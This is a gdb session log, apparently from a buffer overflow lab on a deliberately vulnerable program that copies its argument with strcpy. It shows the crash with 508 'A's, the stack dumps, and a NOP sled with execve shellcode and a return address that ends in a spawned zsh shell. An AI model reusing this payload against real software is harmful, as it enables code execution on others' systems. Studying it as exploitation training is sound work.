@@ -1,0 +1,197 @@
+root@kali32:~/Desktop/Buffer Overflow# gdb vuln
+GNU gdb (Debian 7.10-1+b1) 7.10
+Copyright (C) 2015 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i586-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from vuln...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484da <+0>:	push   %ebp
+   0x080484db <+1>:	mov    %esp,%ebp
+   0x080484dd <+3>:	sub    $0x1f4,%esp
+   0x080484e3 <+9>:	mov    0xc(%ebp),%eax
+   0x080484e6 <+12>:	add    $0x4,%eax
+   0x080484e9 <+15>:	mov    (%eax),%eax
+   0x080484eb <+17>:	push   %eax
+   0x080484ec <+18>:	lea    -0x1f4(%ebp),%eax
+   0x080484f2 <+24>:	push   %eax
+   0x080484f3 <+25>:	call   0x8048340 <strcpy@plt>
+   0x080484f8 <+30>:	add    $0x8,%esp
+   0x080484fb <+33>:	mov    0xc(%ebp),%eax
+   0x080484fe <+36>:	add    $0x4,%eax
+   0x08048501 <+39>:	mov    (%eax),%eax
+   0x08048503 <+41>:	push   %eax
+   0x08048504 <+42>:	call   0x804848b <stringUpr>
+   0x08048509 <+47>:	add    $0x4,%esp
+   0x0804850c <+50>:	mov    0xc(%ebp),%eax
+   0x0804850f <+53>:	add    $0x4,%eax
+   0x08048512 <+56>:	mov    (%eax),%eax
+   0x08048514 <+58>:	push   %eax
+   0x08048515 <+59>:	push   $0x80485b0
+   0x0804851a <+64>:	call   0x8048330 <printf@plt>
+   0x0804851f <+69>:	add    $0x8,%esp
+   0x08048522 <+72>:	mov    $0x0,%eax
+   0x08048527 <+77>:	leave  
+   0x08048528 <+78>:	ret    
+End of assembler dump.
+(gdb) run hello
+Starting program: /root/Desktop/Buffer Overflow/vuln hello
+Uppercase version of your input is: hello
+[Inferior 1 (process 1879) exited normally]
+(gdb) run $(python -c 'print "\x41" * 508')
+Starting program: /root/Desktop/Buffer Overflow/vuln $(python -c 'print "\x41" * 508')
+Uppercase version of your input is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) x/200x ($esp - 550)
+0xbffff03a:	0x8e80b7e4	0x85b0b7fb	0xf0600804	0xea10bfff
+0xbffff04a:	0xf48eb7e4	0xea16bfff	0x8000b7e4	0x851fb7fb
+0xbffff05a:	0x85b00804	0xf48e0804	0x4141bfff	0x41414141
+0xbffff06a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff07a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff08a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff09a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0aa:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0ba:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0ca:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0da:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0ea:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0fa:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff10a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff11a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff12a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff13a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff14a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff15a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff16a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff17a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff18a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff19a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff1aa:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff1ba:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff1ca:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff1da:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff1ea:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff1fa:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff20a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff21a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff22a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff23a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff24a:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff25a:	0x41414141	0x00004141	0xf2f40000	0xf300bfff
+0xbffff26a:	0x0000bfff	0x00000000	0x00000000	0x00000000
+---Type <return> to continue, or q <return> to quit---
+0xbffff27a:	0x822c0000	0x98000804	0x80000804	0x0000b7fb
+0xbffff28a:	0x83900000	0x00000804	0x4efb0000	0x2aebeda4
+0xbffff29a:	0x0000d1ed	0x00000000	0x00000000	0x00020000
+0xbffff2aa:	0x83900000	0x00000804	0x11600000	0xd639b7ff
+0xbffff2ba:	0xf000b7e1	0x0002b7ff	0x83900000	0x00000804
+0xbffff2ca:	0x83b10000	0x84da0804	0x00020804	0xf2f40000
+0xbffff2da:	0x8530bfff	0x85900804	0xbc000804	0xf2ecb7fe
+0xbffff2ea:	0xf930bfff	0x0002b7ff	0xf46b0000	0xf48ebfff
+0xbffff2fa:	0x0000bfff	0xf68b0000	0xf696bfff	0xf6a7bfff
+0xbffff30a:	0xf6b9bfff	0xf6cabfff	0xf6e1bfff	0xf6f1bfff
+0xbffff31a:	0xf705bfff	0xf728bfff	0xf73abfff	0xf756bfff
+0xbffff32a:	0xf760bfff	0xf773bfff	0xfd0cbfff	0xfd32bfff
+0xbffff33a:	0xfd40bfff	0xfd90bfff	0xfd9cbfff	0xfdb4bfff
+0xbffff34a:	0xfdf6bfff	0xfe05bfff	0xfe27bfff	0xfe3cbfff
+(gdb) 
+(gdb) info registers
+eax            0x0	0
+ecx            0x7ffffddf	2147483103
+edx            0xb7fb9ad0	-1208247600
+ebx            0xb7fb8000	-1208254464
+esp            0xbffff260	0xbffff260
+ebp            0x41414141	0x41414141
+esi            0x0	0
+edi            0x8048390	134513552
+eip            0x41414141	0x41414141
+eflags         0x10292	[ AF SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) run $(python -c 'print "\x90" * 426 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51\x51\x51\x51" * 10')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/Desktop/Buffer Overflow/vuln $(python -c 'print "\x90" * 426 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51\x51\x51\x51" * 10')
+Uppercase version of your input is: ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1����$h/zsh/binh/usr��PV�
+                           ����1�̀�1�̀QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+
+Program received signal SIGSEGV, Segmentation fault.
+0x51515151 in ?? ()
+(gdb) x/200x ($esp - 550)
+0xbffff03a:	0x8e80b7e4	0x85b0b7fb	0xf0600804	0xea10bfff
+0xbffff04a:	0xf48eb7e4	0xea16bfff	0x8000b7e4	0x851fb7fb
+0xbffff05a:	0x85b00804	0xf48e0804	0x9090bfff	0x90909090
+0xbffff06a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff07a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff08a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff09a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0aa:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0ba:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0ca:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0da:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0ea:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff0fa:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff10a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff11a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff12a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff13a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff14a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff15a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff16a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff17a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff18a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff19a:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff1aa:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff1ba:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff1ca:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff1da:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff1ea:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff1fa:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff20a:	0x90909090	0xec83c031	0x24048801	0x737a2f68
+0xbffff21a:	0x69622f68	0x752f686e	0xe6897273	0x0bb05650
+0xbffff22a:	0xe189f389	0x80cdd231	0xdb3101b0	0x515180cd
+0xbffff23a:	0x51515151	0x51515151	0x51515151	0x51515151
+0xbffff24a:	0x51515151	0x51515151	0x51515151	0x51515151
+0xbffff25a:	0x51515151	0x00005151	0xf2f40000	0xf300bfff
+0xbffff26a:	0x0000bfff	0x00000000	0x00000000	0x00000000
+0xbffff27a:	0x822c0000	0x98000804	0x80000804	0x0000b7fb
+0xbffff28a:	0x83900000	0x00000804	0xa7250000	0xc33555aa
+0xbffff29a:	0x000069e3	0x00000000	0x00000000	0x00020000
+0xbffff2aa:	0x83900000	0x00000804	0x11600000	0xd639b7ff
+0xbffff2ba:	0xf000b7e1	0x0002b7ff	0x83900000	0x00000804
+0xbffff2ca:	0x83b10000	0x84da0804	0x00020804	0xf2f40000
+0xbffff2da:	0x8530bfff	0x85900804	0xbc000804	0xf2ecb7fe
+0xbffff2ea:	0xf930bfff	0x0002b7ff	0xf46b0000	0xf48ebfff
+0xbffff2fa:	0x0000bfff	0xf68b0000	0xf696bfff	0xf6a7bfff
+0xbffff30a:	0xf6b9bfff	0xf6cabfff	0xf6e1bfff	0xf6f1bfff
+0xbffff31a:	0xf705bfff	0xf728bfff	0xf73abfff	0xf756bfff
+0xbffff32a:	0xf760bfff	0xf773bfff	0xfd0cbfff	0xfd32bfff
+0xbffff33a:	0xfd40bfff	0xfd90bfff	0xfd9cbfff	0xfdb4bfff
+0xbffff34a:	0xfdf6bfff	0xfe05bfff	0xfe27bfff	0xfe3cbfff
+(gdb) run $(python -c 'print "\x90" * 425 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x7a\xf1\xff\xbf" * 10')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/Desktop/Buffer Overflow/vuln $(python -c 'print "\x90" * 425 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x7a\xf1\xff\xbf" * 10')
+Uppercase version of your input is: �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1����$h/zshh/binh/usr��PV�
+                           ����1�̀�1�̀z���z���z���z���z���z���z���z���z���z���
+process 1999 is executing new program: /bin/zsh5
+kali32#                                                                                                                                                  
+Program received signal SIGINT, Interrupt.
+0xb7fdcc38 in ?? ()
+(gdb) 
